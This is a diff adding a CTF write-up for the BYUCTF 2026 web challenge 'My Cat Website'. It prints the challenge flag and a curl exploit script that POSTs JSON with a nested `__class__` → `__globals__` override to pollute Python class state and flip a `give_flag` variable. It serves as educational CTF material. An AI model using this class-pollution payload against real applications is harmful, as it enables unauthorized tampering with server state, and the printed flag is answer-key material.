@@ -1,0 +1,75 @@
+---
+title: "My Cat Website — BYUCTF 2026"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "byuctf-2026-my-cat-website"
+order: 226
+writeupKind: "challenge"
+ctfSlug: "byuctf-2026"
+ctfTitle: "BYUCTF 2026"
+---
+
+# My Cat Website — BYUCTF 2026
+
+> **Category:** `Web Exploitation`  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `byuctf{y0u_m4d3_k1tty_h4ppy}`  
+> **Source Path:** `web/my-cat-website`
+
+---
+
+## Challenge Description
+
+```text
+No standalone challenge prompt was present in the source repository for this entry.
+```
+
+---
+
+## Provided Materials
+
+- [Repository folder](https://github.com/BYU-CSA/BYUCTF-2026/tree/main/web/my-cat-website)
+- [web/my-cat-website/dist.zip](https://github.com/BYU-CSA/BYUCTF-2026/blob/main/web/my-cat-website/dist.zip)
+- [web/my-cat-website/solve.sh](https://github.com/BYU-CSA/BYUCTF-2026/blob/main/web/my-cat-website/solve.sh)
+
+---
+
+## Recon / Initial Analysis
+
+This page imports the BYUCTF 2026 source material for the Web Exploitation challenge **My Cat Website**. The prompt is kept separate from the solve notes, and upstream artifacts are linked so the challenge can be replayed from the original repository.
+
+---
+
+## Vulnerability / Observation
+
+The useful observation comes from the imported solve notes below. I kept the original technical path intact while normalizing the page metadata, challenge grouping, and author attribution for the Volume 2 writeup archive.
+
+---
+
+## Exploitation / Solution
+
+No standalone solve prose was present in the source repository for this entry, but the repository includes a short `solve.sh` that captures the exploit path.
+
+The payload posts a crafted cat object with a nested `__class__` override. That reaches `to_dict.__globals__` and flips `give_flag`, which makes the application return the flag page response.
+
+---
+
+## Full Exploit Script
+
+Source: [web/my-cat-website/solve.sh](https://github.com/BYU-CSA/BYUCTF-2026/blob/main/web/my-cat-website/solve.sh)
+
+```bash
+curl -X POST https://cats.chals.cyberjousting.com/cat \
+     -H "Content-Type: application/json" \
+     -d '{ "name": "Chunky Grumps", "age": 3, "color": "tabby", "is_happy": true, "__class__": { "to_dict": { "__globals__": { "give_flag": true } } } }' 
+
+# should return the flag
+```
+
+---
+
+## Key Takeaways
+
+- The BYUCTF 2026 challenge material is preserved with local archive formatting.
+- The page author is normalized to Imattas aka Zemi.
+- The source repository remains linked for handouts, services, and solve artifacts.
